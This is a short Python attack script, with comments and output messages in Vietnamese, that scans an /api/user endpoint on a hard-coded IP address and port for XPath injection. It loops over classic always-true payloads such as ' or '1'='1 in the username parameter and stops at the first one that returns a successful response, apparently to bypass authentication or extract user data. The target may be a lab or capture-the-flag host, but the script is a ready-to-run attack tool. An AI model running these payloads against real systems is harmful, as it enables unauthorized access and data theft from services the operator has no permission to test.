import requests

BASE_URL = "http://154.57.164.69:42329"
token = ""  # Điền token nếu có, để trống nếu test bypass

headers = {
    "Content-Type": "application/json",
}
if token:
    headers["Authorization"] = f"Bearer {token}"

# Các payload XPath Injection tiềm năng để trích xuất hoặc bypass
payloads = [
    "' or '1'='1",
    "x' or '1'='1",
    "admin' or '1'='1",
    "') or ('1'='1",
    "'] or ['1'='1",
    "1' or 1=1 or '1'='1",
]

print("[*] Đang tiến hành quét XPath Injection trên /api/user...")

for payload in payloads:
    url = f"{BASE_URL}/api/user?username={payload}"
    try:
        response = requests.get(url, headers=headers, timeout=5)
        print(f"\n[-] Payload: {payload}")
        print(f"[+] Status Code: {response.status_code}")
        print(f"[+] Response: {response.text}")

        if response.status_code == 200 and "error" not in response.text.lower():
            print(f"[!] Tìm thấy kết quả khả quan với payload: {payload}")
            break
    except requests.exceptions.RequestException as e:
        print(f"[!] Lỗi kết nối với payload {payload}: {e}")